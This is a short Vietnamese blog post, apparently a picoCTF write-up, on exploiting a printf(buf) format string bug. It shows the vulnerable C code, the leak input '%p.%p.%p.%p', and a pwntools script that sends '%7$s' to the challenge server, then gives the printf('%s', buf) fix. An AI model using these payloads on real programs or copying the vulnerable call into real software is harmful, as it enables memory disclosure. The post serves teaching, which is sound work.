---
layout: post
title: "picoCTF: khai thác format string cơ bản"
tags: [ctf, pwn, picoctf]
image: /images/posts/picoctf-format-string.png
description: "Khai thác lỗi printf(buf) để leak dữ liệu trên stack, bài pwn nhập môn của picoCTF."
---

Một bài pwn nhập môn: chương trình gọi `printf(buf)` trực tiếp với input của người dùng.

## Phân tích

```c
int main() {
    char buf[64];
    fgets(buf, sizeof(buf), stdin);
    printf(buf);   // lỗi format string
    return 0;
}
```

Nhập `%p.%p.%p.%p` để leak giá trị trên stack.

## Script

```python
from pwn import *

p = remote("saturn.picoctf.net", 12345)
p.sendline(b"%7$s")
print(p.recvall())
```

Bài học: luôn dùng `printf("%s", buf)` thay vì `printf(buf)`.
